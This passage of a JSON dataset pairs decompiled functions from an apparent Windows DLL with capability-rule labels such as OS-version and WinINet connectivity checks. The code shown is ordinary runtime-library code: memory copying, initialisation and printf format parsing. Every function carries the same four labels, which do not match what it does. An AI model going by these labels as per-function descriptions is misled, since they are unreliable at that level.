        "decompiled_code": "\nuchar (*) [32] fcn.1800121b0(uchar (*arg1) [32], uchar (*arg2) [32], uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uchar (*pauVar15) [32];\n    uchar (*pauVar16) [32];\n    uchar (*pauVar17) [32];\n    uint *puVar18;\n    uint *puVar19;\n    uchar (*pauVar20) [32];\n    uint *puVar21;\n    uint64_t uVar22;\n    int64_t iVar23;\n    uint64_t uVar24;\n    uint uVar25;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uchar auVar26 [32];\n    uchar auVar30 [32];\n    uchar auVar31 [32];\n    uchar auVar32 [32];\n    uchar auVar33 [32];\n    uchar auVar34 [32];\n    \n    pauVar15 = arg1;\n    if (arg3 < 0x10) {\n    // switch table (16 cases) at 0x1800970b0\n        switch(*(arg3 * 4 + 0x1800970b0) + 0x180000000) {\n        case 0x1800121de:\n            return pauVar15;\n        case 0x1800121e0:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            uVar2 = (*arg2)[0xe];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            (*arg1)[0xe] = uVar2;\n            return pauVar15;\n        case 0x180012200:\n            uVar3 = *(*arg2 + 8);\n            uVar2 = (*arg2)[10];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar2;\n            return pauVar15;\n        case 0x180012218:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x180012220:\n            uVar3 = *(*arg2 + 4);\n            uVar2 = (*arg2)[6];\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            (*arg1)[6] = uVar2;\n            return pauVar15;\n        case 0x180012238:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            return pauVar15;\n        case 0x18001224f:\n            uVar2 = (*arg2)[2];\n            **arg1 = **arg2;\n            (*arg1)[2] = uVar2;\n            return pauVar15;\n        case 0x180012260:\n            uVar4 = *(*arg2 + 8);\n            uVar2 = (*arg2)[0xc];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            (*arg1)[0xc] = uVar2;\n            return pauVar15;\n        case 0x180012276:\n            uVar3 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            return pauVar15;\n        case 0x180012285:\n            uVar2 = (*arg2)[8];\n            **arg1 = **arg2;\n            (*arg1)[8] = uVar2;\n            return pauVar15;\n        case 0x180012293:\n            uVar4 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            return pauVar15;\n        case 0x1800122a0:\n            uVar3 = *(*arg2 + 4);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            return pauVar15;\n        case 0x1800122af:\n            uVar2 = (*arg2)[4];\n            **arg1 = **arg2;\n            (*arg1)[4] = uVar2;\n            return pauVar15;\n        case 0x1800122bd:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x1800122c4:\n            (*arg1)[0] = (*arg2)[0];\n            return pauVar15;\n        case 0x1800122ca:\n            **arg1 = **arg2;\n            return pauVar15;\n        }\n    }\n    if (arg3 < 0x21) {\n        uVar4 = *(*arg2 + 4);\n        uVar5 = *(*arg2 + 8);\n        uVar6 = *(*arg2 + 0xc);\n        puVar18 = arg2[-1] + arg3 + 0x10;\n        uVar25 = *puVar18;\n        uVar27 = puVar18[1];\n        uVar28 = puVar18[2];\n        uVar29 = puVar18[3];\n        **arg1 = **arg2;\n        *(*arg1 + 4) = uVar4;\n        *(*arg1 + 8) = uVar5;\n        *(*arg1 + 0xc) = uVar6;\n        puVar18 = arg1[-1] + arg3 + 0x10;\n        *puVar18 = uVar25;\n        puVar18[1] = uVar27;\n        puVar18[2] = uVar28;\n        puVar18[3] = uVar29;\n        return pauVar15;\n    }\n    if ((arg2 < arg1) && (arg1 < *arg2 + arg3)) {\n        iVar23 = arg2 - arg1;\n        puVar18 = arg1 + iVar23 + (arg3 - 0x10);\n        uVar4 = puVar18[1];\n        uVar5 = puVar18[2];\n        uVar6 = puVar18[3];\n        puVar19 = arg1[-1] + arg3 + 0x10;\n        uVar22 = arg3 - 0x10;\n        puVar21 = puVar19;\n        uVar25 = *puVar18;\n        uVar27 = uVar4;\n        uVar28 = uVar5;\n        uVar29 = uVar6;\n        if ((puVar19 & 0xf) != 0) {\n            puVar21 = puVar19 & 0xfffffffffffffff0;\n            puVar1 = puVar21 + iVar23;\n            uVar25 = *puVar1;\n            uVar27 = puVar1[1];\n            uVar28 = puVar1[2];\n            uVar29 = puVar1[3];\n            *puVar19 = *puVar18;\n            *(arg1[-1] + arg3 + 0x14) = uVar4;\n            *(arg1[-1] + arg3 + 0x18) = uVar5;\n            *(arg1[-1] + arg3 + 0x1c) = uVar6;\n            uVar22 = puVar21 - arg1;\n        }\n        uVar24 = uVar22 >> 7;\n        if (uVar24 != 0) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar18 = puVar21;\n            while( true ) {\n                puVar19 = puVar18 + iVar23 + -0x10;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar21 = puVar18 + iVar23 + -0x20;\n                uVar25 = *puVar21;\n                uVar27 = puVar21[1];\n                uVar28 = puVar21[2];\n                uVar29 = puVar21[3];\n                puVar21 = puVar18 + -0x20;\n                puVar18[-4] = *puVar19;\n                puVar18[-3] = uVar4;\n                puVar18[-2] = uVar5;\n                puVar18[-1] = uVar6;\n                puVar18[-8] = uVar25;\n                puVar18[-7] = uVar27;\n                puVar18[-6] = uVar28;\n                puVar18[-5] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x30;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x40;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                uVar24 = uVar24 - 1;\n                puVar18[-0xc] = *puVar19;\n                puVar18[-0xb] = uVar4;\n                puVar18[-10] = uVar5;\n                puVar18[-9] = uVar6;\n                puVar18[-0x10] = uVar25;\n                puVar18[-0xf] = uVar27;\n                puVar18[-0xe] = uVar28;\n                puVar18[-0xd] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x50;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x60;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                puVar18[-0x14] = *puVar19;\n                puVar18[-0x13] = uVar4;\n                puVar18[-0x12] = uVar5;\n                puVar18[-0x11] = uVar6;\n                puVar18[-0x18] = uVar25;\n                puVar18[-0x17] = uVar27;\n                puVar18[-0x16] = uVar28;\n                puVar18[-0x15] = uVar29;\n                puVar1 = puVar18 + iVar23 + -0x70;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                puVar19 = puVar21 + iVar23;\n                uVar25 = *puVar19;\n                uVar27 = puVar19[1];\n                uVar28 = puVar19[2];\n                uVar29 = puVar19[3];\n                if (uVar24 == 0) break;\n                puVar18[-0x1c] = *puVar1;\n                puVar18[-0x1b] = uVar4;\n                puVar18[-0x1a] = uVar5;\n                puVar18[-0x19] = uVar6;\n                *puVar21 = uVar25;\n                puVar18[-0x1f] = uVar27;\n                puVar18[-0x1e] = uVar28;\n                puVar18[-0x1d] = uVar29;\n                puVar18 = puVar21;\n            }\n            puVar18[-0x1c] = *puVar1;\n            puVar18[-0x1b] = uVar4;\n            puVar18[-0x1a] = uVar5;\n            puVar18[-0x19] = uVar6;\n            uVar22 = uVar22 & 0x7f;\n        }\n        for (uVar24 = uVar22 >> 4; uVar24 != 0; uVar24 = uVar24 - 1) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar21 = puVar21 + -4;\n            puVar18 = puVar21 + iVar23;\n            uVar25 = *puVar18;\n            uVar27 = puVar18[1];\n            uVar28 = puVar18[2];\n            uVar29 = puVar18[3];\n        }\n        if ((uVar22 & 0xf) != 0) {\n            uVar4 = *(*arg2 + 4);\n            uVar5 = *(*arg2 + 8);\n            uVar6 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar4;\n            *(*arg1 + 8) = uVar5;\n            *(*arg1 + 0xc) = uVar6;\n        }\n        *puVar21 = uVar25;\n        puVar21[1] = uVar27;\n        puVar21[2] = uVar28;\n        puVar21[3] = uVar29;\n        return arg1;\n    }\n    if (*0x180090018 < 3) {\n        if ((arg3 < 0x801) || ((*0x18009140c & 2) == 0)) {\n            if (0x80 < arg3) {\n                iVar23 = (arg1 & 0xf) - 0x10;\n                puVar18 = arg1 - iVar23;\n                puVar21 = arg2 - iVar23;\n                arg3 = arg3 + iVar23;\n                if (0x80 < arg3) {\n                    do {\n                        uVar4 = puVar21[1];\n                        uVar5 = puVar21[2];\n                        uVar6 = puVar21[3];\n                        uVar25 = puVar21[4];\n                        uVar27 = puVar21[5];\n                        uVar28 = puVar21[6];\n                        uVar29 = puVar21[7];\n                        uVar7 = puVar21[8];\n                        uVar8 = puVar21[9];\n                        uVar9 = puVar21[10];\n                        uVar10 = puVar21[0xb];\n                        uVar11 = puVar21[0xc];\n                        uVar12 = puVar21[0xd];\n                        uVar13 = puVar21[0xe];\n                        uVar14 = puVar21[0xf];\n                        *puVar18 = *puVar21;\n                        puVar18[1] = uVar4;\n                        puVar18[2] = uVar5;\n                        puVar18[3] = uVar6;\n                        puVar18[4] = uVar25;\n                        puVar18[5] = uVar27;\n                        puVar18[6] = uVar28;\n                        puVar18[7] = uVar29;\n                        puVar18[8] = uVar7;\n                        puVar18[9] = uVar8;\n                        puVar18[10] = uVar9;\n                        puVar18[0xb] = uVar10;\n                        puVar18[0xc] = uVar11;\n                        puVar18[0xd] = uVar12;\n                        puVar18[0xe] = uVar13;\n                        puVar18[0xf] = uVar14;\n                        uVar4 = puVar21[0x11];\n                        uVar5 = puVar21[0x12];\n                        uVar6 = puVar21[0x13];\n                        uVar25 = puVar21[0x14];\n                        uVar27 = puVar21[0x15];\n                        uVar28 = puVar21[0x16];\n                        uVar29 = puVar21[0x17];\n                        uVar7 = puVar21[0x18];\n                        uVar8 = puVar21[0x19];\n                        uVar9 = puVar21[0x1a];\n                        uVar10 = puVar21[0x1b];\n                        uVar11 = puVar21[0x1c];\n                        uVar12 = puVar21[0x1d];\n                        uVar13 = puVar21[0x1e];\n                        uVar14 = puVar21[0x1f];\n                        puVar18[0x10] = puVar21[0x10];\n                        puVar18[0x11] = uVar4;\n                        puVar18[0x12] = uVar5;\n                        puVar18[0x13] = uVar6;\n                        puVar18[0x14] = uVar25;\n                        puVar18[0x15] = uVar27;\n                        puVar18[0x16] = uVar28;\n                        puVar18[0x17] = uVar29;\n                        puVar18[0x18] = uVar7;\n                        puVar18[0x19] = uVar8;\n                        puVar18[0x1a] = uVar9;\n                        puVar18[0x1b] = uVar10;\n                        puVar18[0x1c] = uVar11;\n                        puVar18[0x1d] = uVar12;\n                        puVar18[0x1e] = uVar13;\n                        puVar18[0x1f] = uVar14;\n                        puVar18 = puVar18 + 0x20;\n                        puVar21 = puVar21 + 0x20;\n                        arg3 = arg3 - 0x80;\n                    } while (0x7f < arg3);\n                }\n            }\n    // WARNING: Could not recover jumptable at 0x0001800126c6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (9 cases) at 0x180097138\n            pauVar15 = (*(*((arg3 + 0xf >> 4) * 4 + 0x180097138) + 0x180000000))();\n            return pauVar15;\n        }\n    }\n    else if (((arg3 < 0x2001) || (0x180000 < arg3)) || ((*0x18009140c & 2) == 0)) {\n        auVar26 = vmovdqu_avx(*arg2);\n        auVar34 = vmovdqu_avx(*(arg2[-1] + arg3));\n        if (0x100 < arg3) {\n            iVar23 = (arg1 & 0x1f) - 0x20;\n            pauVar16 = arg1 - iVar23;\n            arg2 = arg2 - iVar23;\n            arg3 = arg3 + iVar23;\n            if (0x100 < arg3) {\n                if (0x180000 < arg3) {\n                    do {\n                        uVar22 = arg3;\n                        pauVar20 = arg2;\n                        pauVar17 = pauVar16;\n                        auVar30 = vmovdqu_avx(*pauVar20);\n                        auVar31 = vmovdqu_avx(pauVar20[1]);\n                        auVar32 = vmovdqu_avx(pauVar20[2]);\n                        auVar33 = vmovdqu_avx(pauVar20[3]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *pauVar17 = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[1] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[2] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[3] = auVar30;\n                        auVar30 = vmovdqu_avx(pauVar20[4]);\n                        auVar31 = vmovdqu_avx(pauVar20[5]);\n                        auVar32 = vmovdqu_avx(pauVar20[6]);\n                        auVar33 = vmovdqu_avx(pauVar20[7]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        pauVar17[4] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[5] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[6] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[7] = auVar30;\n                        pauVar16 = pauVar17[8];\n                        arg2 = pauVar20[8];\n                        arg3 = uVar22 - 0x100;\n                    } while (0xff < uVar22 - 0x100);\n                    uVar24 = uVar22 - 0xe1 & 0xffffffffffffffe0;\n    // switch table (18 cases) at 0x180097114\n                    switch(uVar22) {\n                    case 0x1e1:\n                    case 0x1e2:\n                    case 0x1e3:\n                    case 0x1e4:\n                    case 0x1e5:\n                    case 0x1e6:\n                    case 0x1e7:\n                    case 0x1e8:\n                    case 0x1e9:\n                    case 0x1ea:\n                    case 0x1eb:\n                    case 0x1ec:\n                    case 0x1ed:\n                    case 0x1ee:\n                    case 0x1ef:\n                    case 0x1f0:\n                    case 0x1f1:\n                    case 0x1f2:\n                    case 499:\n                    case 500:\n                    case 0x1f5:\n                    case 0x1f6:\n                    case 0x1f7:\n                    case 0x1f8:\n                    case 0x1f9:\n                    case 0x1fa:\n                    case 0x1fb:\n                    case 0x1fc:\n                    case 0x1fd:\n                    case 0x1fe:\n                    case 0x1ff:\n                        auVar30 = vmovdqu_avx(*(*pauVar20 + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(*pauVar17 + uVar24) = auVar30;\n                    case 0x1c1:\n                    case 0x1c2:\n                    case 0x1c3:\n                    case 0x1c4:\n                    case 0x1c5:\n                    case 0x1c6:\n                    case 0x1c7:\n                    case 0x1c8:\n                    case 0x1c9:\n                    case 0x1ca:\n                    case 0x1cb:\n                    case 0x1cc:\n                    case 0x1cd:\n                    case 0x1ce:\n                    case 0x1cf:\n                    case 0x1d0:\n                    case 0x1d1:\n                    case 0x1d2:\n                    case 0x1d3:\n                    case 0x1d4:\n                    case 0x1d5:\n                    case 0x1d6:\n                    case 0x1d7:\n                    case 0x1d8:\n                    case 0x1d9:\n                    case 0x1da:\n                    case 0x1db:\n                    case 0x1dc:\n                    case 0x1dd:\n                    case 0x1de:\n                    case 0x1df:\n                    case 0x1e0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[1] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[1] + uVar24) = auVar30;\n                    case 0x1a1:\n                    case 0x1a2:\n                    case 0x1a3:\n                    case 0x1a4:\n                    case 0x1a5:\n                    case 0x1a6:\n                    case 0x1a7:\n                    case 0x1a8:\n                    case 0x1a9:\n                    case 0x1aa:\n                    case 0x1ab:\n                    case 0x1ac:\n                    case 0x1ad:\n                    case 0x1ae:\n                    case 0x1af:\n                    case 0x1b0:\n                    case 0x1b1:\n                    case 0x1b2:\n                    case 0x1b3:\n                    case 0x1b4:\n                    case 0x1b5:\n                    case 0x1b6:\n                    case 0x1b7:\n                    case 0x1b8:\n                    case 0x1b9:\n                    case 0x1ba:\n                    case 0x1bb:\n                    case 0x1bc:\n                    case 0x1bd:\n                    case 0x1be:\n                    case 0x1bf:\n                    case 0x1c0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[2] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[2] + uVar24) = auVar30;\n                    case 0x181:\n                    case 0x182:\n                    case 0x183:\n                    case 0x184:\n                    case 0x185:\n                    case 0x186:\n                    case 0x187:\n                    case 0x188:\n                    case 0x189:\n                    case 0x18a:\n                    case 0x18b:\n                    case 0x18c:\n                    case 0x18d:\n                    case 0x18e:\n                    case 399:\n                    case 400:\n                    case 0x191:\n                    case 0x192:\n                    case 0x193:\n                    case 0x194:\n                    case 0x195:\n                    case 0x196:\n                    case 0x197:\n                    case 0x198:\n                    case 0x199:\n                    case 0x19a:\n                    case 0x19b:\n                    case 0x19c:\n                    case 0x19d:\n                    case 0x19e:\n                    case 0x19f:\n                    case 0x1a0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[3] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[3] + uVar24) = auVar30;\n                    case 0x161:\n                    case 0x162:\n                    case 0x163:\n                    case 0x164:\n                    case 0x165:\n                    case 0x166:\n                    case 0x167:\n                    case 0x168:\n                    case 0x169:\n                    case 0x16a:\n                    case 0x16b:\n                    case 0x16c:\n                    case 0x16d:\n                    case 0x16e:\n                    case 0x16f:\n                    case 0x170:\n                    case 0x171:\n                    case 0x172:\n                    case 0x173:\n                    case 0x174:\n                    case 0x175:\n                    case 0x176:\n                    case 0x177:\n                    case 0x178:\n                    case 0x179:\n                    case 0x17a:\n                    case 0x17b:\n                    case 0x17c:\n                    case 0x17d:\n                    case 0x17e:\n                    case 0x17f:\n                    case 0x180:\n                        auVar30 = vmovdqu_avx(*(pauVar20[4] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[4] + uVar24) = auVar30;\n                    case 0x141:\n                    case 0x142:\n                    case 0x143:\n                    case 0x144:\n                    case 0x145:\n                    case 0x146:\n                    case 0x147:\n                    case 0x148:\n                    case 0x149:\n                    case 0x14a:\n                    case 0x14b:\n                    case 0x14c:\n                    case 0x14d:\n                    case 0x14e:\n                    case 0x14f:\n                    case 0x150:\n                    case 0x151:\n                    case 0x152:\n                    case 0x153:\n                    case 0x154:\n                    case 0x155:\n                    case 0x156:\n                    case 0x157:\n                    case 0x158:\n                    case 0x159:\n                    case 0x15a:\n                    case 0x15b:\n                    case 0x15c:\n                    case 0x15d:\n                    case 0x15e:\n                    case 0x15f:\n                    case 0x160:\n                        auVar30 = vmovdqu_avx(*(pauVar20[5] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[5] + uVar24) = auVar30;\n                    case 0x121:\n                    case 0x122:\n                    case 0x123:\n                    case 0x124:\n                    case 0x125:\n                    case 0x126:\n                    case 0x127:\n                    case 0x128:\n                    case 0x129:\n                    case 0x12a:\n                    case 299:\n                    case 300:\n                    case 0x12d:\n                    case 0x12e:\n                    case 0x12f:\n                    case 0x130:\n                    case 0x131:\n                    case 0x132:\n                    case 0x133:\n                    case 0x134:\n                    case 0x135:\n                    case 0x136:\n                    case 0x137:\n                    case 0x138:\n                    case 0x139:\n                    case 0x13a:\n                    case 0x13b:\n                    case 0x13c:\n                    case 0x13d:\n                    case 0x13e:\n                    case 0x13f:\n                    case 0x140:\n                        auVar30 = vmovdqu_avx(*(pauVar20[6] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[6] + uVar24) = auVar30;\n                    default:\n                        auVar34 = vmovdqu_avx(auVar34);\n                        *(pauVar17[-1] + uVar22) = auVar34;\n                    case 0x100:\n                        auVar26 = vmovdqu_avx(auVar26);\n                        *arg1 = auVar26;\n                        vzeroupper_avx();\n                        return pauVar15;\n                    }\n                }\n                do {\n                    auVar34 = vmovdqu_avx(*arg2);\n                    auVar30 = vmovdqu_avx(arg2[1]);\n                    auVar31 = vmovdqu_avx(arg2[2]);\n                    auVar32 = vmovdqu_avx(arg2[3]);\n                    *pauVar16 = auVar34;\n                    pauVar16[1] = auVar30;\n                    pauVar16[2] = auVar31;\n                    pauVar16[3] = auVar32;\n                    auVar34 = vmovdqu_avx(arg2[4]);\n                    auVar30 = vmovdqu_avx(arg2[5]);\n                    auVar31 = vmovdqu_avx(arg2[6]);\n                    auVar32 = vmovdqu_avx(arg2[7]);\n                    pauVar16[4] = auVar34;\n                    pauVar16[5] = auVar30;\n                    pauVar16[6] = auVar31;\n                    pauVar16[7] = auVar32;\n                    pauVar16 = pauVar16[8];\n                    arg2 = arg2[8];\n                    arg3 = arg3 - 0x100;\n                } while (0xff < arg3);\n            }\n        }\n    // WARNING: Could not recover jumptable at 0x000180012422. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (27 cases) at 0x1800970f0\n        pauVar15 = (*(*((arg3 + 0x1f >> 5) * 4 + 0x1800970f0) + 0x180000000))(SUB328(auVar26, 0));\n        return pauVar15;\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        (*arg1)[0] = (*arg2)[0];\n        arg2 = *arg2 + 1;\n        arg1 = *arg1 + 1;\n    }\n    return pauVar15;\n}\n",
        "token_count": 7522
    },
    "18001503": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180014e4d)\n// WARNING: Removing unreachable block (ram,0x000180014e5a)\n// WARNING: Removing unreachable block (ram,0x000180014e64)\n// WARNING: Removing unreachable block (ram,0x000180014e73)\n// WARNING: Removing unreachable block (ram,0x000180014e7e)\n// WARNING: Removing unreachable block (ram,0x000180014e87)\n// WARNING: Removing unreachable block (ram,0x000180014e90)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001503c(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    uint *var_20h;\n    int32_t *var_bp_18h;\n    ulong *var_bp_10h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = auStackX16;\n    var_28h._0_1_ = 0;\n    var_bp_18h = aiStackX24;\n    var_bp_10h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.180014c90(var_30h, &var_2ch + 4, &var_20h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.180014eec(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "180016b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180016b14(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x180047a50;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x180045380)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x180047b50);\n    if (piVar3 == 0x180047b50) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x180047a50) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x180045380)(0);\n                }\n                bVar4 = piVar3 != 0x180047a58;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 269
    },
    "18001cf2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.18001cf2c(int64_t arg1)\n\n{\n    uchar uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    \n    cVar4 = fcn.18001d338(arg1);\n    if (cVar4 == '\\0') {\n        puVar5 = fcn.180023574();\n        *puVar5 = 0x16;\n        uVar6 = fcn.18001482c();\n        uVar6 = uVar6 & 0xffffffffffffff00;\n    }\n    else {\n        iVar2 = *(arg1 + 0x468);\n        uVar1 = *(arg1 + 0x41);\n        iVar3 = *(iVar2 + 8);\n        if (*(iVar2 + 0x10) == iVar3) {\n            if (*(iVar2 + 0x18) == '\\0') {\n                *(arg1 + 0x28) = 0xffffffff;\n            }\n            else {\n                *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            *(iVar2 + 0x10) = *(iVar2 + 0x10) + 1;\n            ***(arg1 + 0x468) = uVar1;\n            **(arg1 + 0x468) = **(arg1 + 0x468) + 1;\n        }\n        uVar6 = CONCAT71(iVar3 >> 8, 1);\n    }\n    return uVar6;\n}\n",
        "token_count": 382
    },
    "18001d7d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.18001d7d0(uint8_t *arg1)\n\n{\n    int32_t *arg4;\n    uint8_t *arg1_00;\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint64_t in_RAX;\n    uint *puVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    ulong uVar9;\n    ushort *arg2;\n    uchar uVar10;\n    uint32_t uVar11;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    uVar1 = arg1[0x41];\n    pcVar8 = in_RAX & 0xffffffffffffff00;\n    if (uVar1 != 0x46) {\n        if (uVar1 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x00018001d93a;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar1 == 0x49) {\n                pcVar4 = *(arg1 + 0x18);\n                cVar2 = *pcVar4;\n                if ((cVar2 == '3') && (pcVar4[1] == '2')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 == '6') && (pcVar4[1] == '4')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 + 0xa8U < 0x21) && (pcVar8 = cVar2 + 0xa8U,  (0x120821001U >> (pcVar8 & 0x3f) & 1) != 0)\n                        ) {\n                    *(arg1 + 0x3c) = 9;\n                }\n            }\n            else if (uVar1 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar1 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar1 == 0x68) {\n                    if (**(arg1 + 0x18) == 'h') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x1;\n                    }\n                    else {\n                        pcVar8 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar1 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x00018001d93a;\n                    }\n                    if (uVar1 != 0x6c) {\n                        if (uVar1 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar1 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar1 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x00018001d93a;\n                    }\n                    if (**(arg1 + 0x18) == 'l') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x4;\n                    }\n                    else {\n                        pcVar8 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = pcVar8;\n            }\ncode_r0x00018001d93a:\n            return CONCAT71(pcVar8 >> 8, 1);\n        }\n        puVar6 = fcn.180023574();\n        *puVar6 = 0x16;\n        uVar7 = fcn.18001482c();\n        return uVar7 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x00018001d93a;\n    *(arg1 + 0x2c) = 7;\n    uVar1 = arg1[0x41];\n    uVar10 = 0x78;\n    if (uVar1 < 'e') {\n        if (uVar1 == 100) 